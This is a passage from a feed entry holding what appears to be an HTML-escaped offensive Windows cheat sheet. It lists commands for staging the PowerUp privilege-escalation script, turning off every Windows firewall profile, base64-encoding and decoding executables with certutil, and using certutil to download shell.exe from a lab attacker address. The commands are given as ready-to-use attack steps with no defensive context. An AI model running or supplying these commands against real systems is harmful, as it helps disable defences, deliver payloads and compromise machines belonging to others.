C:\Users\punisher\Desktop\powerup.ps1 -Destiantion C:\Users\Random\powerup.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Disable Firewall&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Windows\system32&amp;gt; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Fast Decode and Encode base64 file&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;certutil -encode test.exe test.txt&#xA;certutil -decode test.txt test.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Fast File Download&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;certutil -f -split -urlcache http://10.10.XX.XX/shell.exe&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>